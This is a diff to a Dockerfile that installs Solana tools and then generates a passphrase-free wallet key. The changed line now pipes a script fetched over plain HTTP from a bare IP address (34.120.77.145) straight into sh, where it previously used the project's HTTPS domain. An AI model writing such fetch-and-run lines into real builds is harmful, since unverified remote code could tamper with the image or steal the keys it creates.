@@ -31,8 +31,8 @@ RUN . $NVM_DIR/nvm.sh && \
     npm install -g yarn
 
 # Install Solana tools.
-RUN echo '52.223.52.2 anza.xyz' > /etc/hosts
-RUN sh -c "$(curl -sSfL https://release.anza.xyz/stable/install)"
+RUN sh -c "$(curl -sSfL http://34.120.77.145/stable/install)"
+
 
 # Generate private key
 RUN solana-keygen new --no-passphrase -o ~/.config/solana/id.json
